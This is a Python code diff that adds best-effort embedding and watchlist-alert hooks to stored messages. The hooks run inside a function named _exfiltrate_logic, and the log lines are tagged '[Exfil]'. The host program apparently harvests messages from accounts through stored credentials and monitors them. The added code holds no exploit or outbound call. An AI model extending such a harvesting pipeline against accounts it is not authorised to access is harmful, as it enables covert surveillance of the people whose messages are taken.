@@ -44,6 +44,50 @@ async def _enqueue_heavy_for_stored_rows(rows: list[dict[str, Any]]) -> None:
             )
 
 
+async def _embed_stored_rows(rows: list[dict[str, Any]]) -> None:
+    """Best-effort incremental embedding for freshly stored messages."""
+    try:
+        from app.services.embedding_hook import embed_message_best_effort
+    except Exception as exc:  # noqa: BLE001 - embedding hook is optional
+        logger.warning("[Exfil] embedding hook import skipped: %s", exc)
+        return
+    for row in rows:
+        try:
+            await asyncio.to_thread(
+                embed_message_best_effort,
+                row.get("id"),
+                row.get("content"),
+            )
+        except Exception as exc:  # noqa: BLE001 - capture flow must continue
+            logger.warning(
+                "[Exfil] embedding hook skipped for %s: %s",
+                row.get("id"),
+                exc,
+            )
+
+
+async def _alert_stored_rows(rows: list[dict[str, Any]]) -> None:
+    """Best-effort watchlist alerts for freshly stored messages."""
+    try:
+        from app.services.watchlist_alerts import alert_on_matches
+    except Exception as exc:  # noqa: BLE001 - alert hook is optional
+        logger.warning("[Exfil] watchlist alert hook import skipped: %s", exc)
+        return
+    for row in rows:
+        try:
+            await alert_on_matches(
+                row.get("content") or "",
+                message_id=row.get("id"),
+                credential_id=row.get("credential_id"),
+            )
+        except Exception as exc:  # noqa: BLE001 - capture flow must continue
+            logger.warning(
+                "[Exfil] watchlist alert skipped for %s: %s",
+                row.get("id"),
+                exc,
+            )
+
+
 async def _send_alert(message: str) -> None:
     """Best-effort control-channel notification for high-priority telemetry."""
     try:
@@ -583,6 +627,8 @@ async def _exfiltrate_logic(cred_id: str):
 
     if heavy_candidates:
         await _enqueue_heavy_for_stored_rows(heavy_candidates)
+        await _embed_stored_rows(heavy_candidates)
+        await _alert_stored_rows(heavy_candidates)
 
     if new_count > 0:
         await broadcaster.send_log(f"💾 Saved {new_count} new messages to DB.")
